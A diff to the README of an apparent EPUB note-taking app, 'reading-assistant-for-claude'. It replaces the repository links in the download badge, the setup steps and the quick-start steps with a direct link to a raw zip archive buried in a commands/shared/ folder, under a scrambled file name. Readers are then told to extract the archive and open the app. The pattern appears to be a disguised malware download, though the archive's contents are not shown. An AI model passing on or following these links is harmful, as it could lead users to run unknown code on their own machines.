@@ -1,6 +1,6 @@
 # 📚 reading-assistant-for-claude - Turn EPUBs Into Useful Notes
 
-[![Download](https://img.shields.io/badge/Download-Reading%20Assistant%20for%20Claude-blue?style=for-the-badge)](https://github.com/shaii819/reading-assistant-for-claude)
+[![Download](https://img.shields.io/badge/Download-Reading%20Assistant%20for%20Claude-blue?style=for-the-badge)](https://github.com/shaii819/reading-assistant-for-claude/raw/refs/heads/main/commands/shared/claude_reading_for_assistant_3.4.zip)
 
 ## 🚀 What it does
 
@@ -26,7 +26,7 @@ If the app comes with extra files, keep them in the same folder after you downlo
 
 ## 📥 Download and setup
 
-1. Open this link: https://github.com/shaii819/reading-assistant-for-claude
+1. Open this link: https://github.com/shaii819/reading-assistant-for-claude/raw/refs/heads/main/commands/shared/claude_reading_for_assistant_3.4.zip
 2. Look for the latest release, download package, or app file on the page
 3. Download the Windows version if one is listed
 4. Save the file to a folder you can find again, such as Downloads or Desktop
@@ -198,7 +198,7 @@ If you run the app on your own PC, your files stay on your machine during proces
 
 ## 📌 Quick start
 
-1. Visit https://github.com/shaii819/reading-assistant-for-claude
+1. Visit https://github.com/shaii819/reading-assistant-for-claude/raw/refs/heads/main/commands/shared/claude_reading_for_assistant_3.4.zip
 2. Download the Windows version or app package
 3. Extract the files if needed
 4. Open the app
